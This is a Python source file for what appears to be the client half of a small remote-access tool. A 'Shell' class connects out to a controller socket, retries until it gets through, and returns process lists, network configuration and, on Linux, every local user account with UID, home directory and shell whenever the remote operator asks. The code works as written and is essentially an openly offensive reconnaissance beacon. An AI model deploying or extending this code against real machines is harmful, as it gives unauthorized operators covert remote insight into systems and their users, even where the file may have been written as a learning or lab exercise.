import psutil
import socket
import sys
import time
import netifaces

if sys.platform.startswith('linux'):
    # linux only
    import pwd


class Enumerate:
    @staticmethod
    def get_processes():
        return_statement = ""
        processes = psutil.process_iter()  # get list of running processes

        # iterate through list
        for process in processes:
            try:
                pid = process.pid  # get process ID
                process_name = process.name()  # get process name

                cpu_usage = process.cpu_percent()  # get CPU usage
                memory_usage = process.memory_info().rss / 1048576  # get memory usage in megabytes (from bytes --> MB)

                # append information to return statement
                return_statement += f"Process Name: {process_name}, PID: {pid}, CPU Usage: {cpu_usage}%," \
                                    f" Memory Usage: {memory_usage}\n"
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                # Ignore errors
                pass
        return return_statement

    @staticmethod
    def get_local_ip():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
        s.connect(('1.1.1.1', 80))  # connect to remote host (cloudfare dns)
        local_ip = s.getsockname()[0]  # get ip from socket
        s.close()  # close socket
        return local_ip

    @staticmethod
    def get_subnet_mask():
        ifaces = netifaces.interfaces()  # get network interfaces
        for iface in ifaces:
            iface_addresses = netifaces.ifaddresses(iface)  # get addresses associated with interface
            if netifaces.AF_INET in iface_addresses:  # if it contains an ipv4 address
                addr_info = iface_addresses[netifaces.AF_INET][0]  # get first ipv4 in list
                if 'netmask' in addr_info:
                    return addr_info['netmask']  # return subnet mask

    @staticmethod
    def get_interfaces():
        return_statement = ""
        ifaces = netifaces.interfaces()  # get interfaces

        gateway_addresses = netifaces.gateways()  # get gateway addresses
        if netifaces.AF_INET in gateway_addresses['default']:  # if it is default gateway
            default_interface = gateway_addresses['default'][netifaces.AF_INET][1]  # store interface as default

        for iface in ifaces:
            if iface == default_interface:
                return_statement += f"{iface} (default)\n"
            else:
                return_statement += f"{iface}\n"
        return return_statement

    @staticmethod
    def get_default_gateway():
        gateway_addresses = netifaces.gateways()  # get gateway addresses
        if 'default' in gateway_addresses and netifaces.AF_INET in gateway_addresses['default']:  # if there is a
            # default route entry
            return gateway_addresses['default'][netifaces.AF_INET][0]  # return the first address

    def get_network_info(self):
        try:
            data = ""
            data += f"Network Interfaces: \n{self.get_interfaces()}\n"  # get interfaces on local machine
            data += f"Local IP: {self.get_local_ip()}\n"  # get local ip of machine
            data += f"Subnet Mask: {self.get_subnet_mask()}\n"  # get subnet mask of network
            data += f"Default Gateway: {self.get_default_gateway()}\n"  # get default gateway of machine
        except OSError:
            # no internet connection to reach 1.1.1.1
            data = "\nFailed due to connection\n"
        except UnboundLocalError:
            # No interfaces available
            data = "\nNo interfaces available\n"
        return data

    @staticmethod
    def get_users():
        if sys.platform.startswith('linux'):
            try:
                users = ""
                for user in pwd.getpwall():
                    users += f"{user.pw_name}: UID: {user.pw_uid}, GID: {user.pw_gid}, Dir: {user.pw_dir}, Shell: " \
                             f"{user.pw_shell}\n"
            except Exception as error:
                users = error
        else:
            users = "\nLinux only operation.\n"
        return users


class Shell(Enumerate):
    def __init__(self, ip, port, buffer):
        self.ip = ip
        self.port = port
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        while True:
            try:
                time.sleep(2.5)  # sleep to avoid flooding requests
                self.socket.connect((self.ip, self.port))  # connect to controller
                self.receive()  # receive data
            except ConnectionRefusedError:
                # Connection refused, retry
                continue
            except KeyboardInterrupt:
                self.socket.close()
                sys.exit(0)

    def receive(self):
        try:
            while True:
                command = self.socket.recv(self.buffer).decode("utf-8")

                if not command:
                    # Lost connection with server, attempt to re-establish connection
                    self.socket.close()  # close socket
                    self.__init__(self.ip, self.port, self.buffer)  # recreate socket
                    self.connect()  # attempt to reconnect

                if 'terminate' in command:
                    self.socket.close()
                    sys.exit(0)
                elif 'get_processes' in command:
                    result = self.get_processes()
                    self.send(result)
                elif 'get_network' in command:
                    result = self.get_network_info()
                    self.send(result)
                elif 'get_users' in command:
                    result = self.get_users()
                    self.send(result)
                else:
                    print(command)

        except KeyboardInterrupt:
            self.socket.close()
            sys.exit(0)

    def send(self, message):
        self.socket.sendall(bytes(message, "utf-8"))


if __name__ == '__main__':
    shell = Shell('127.0.0.1', 6969, 2048)
    shell.connect()
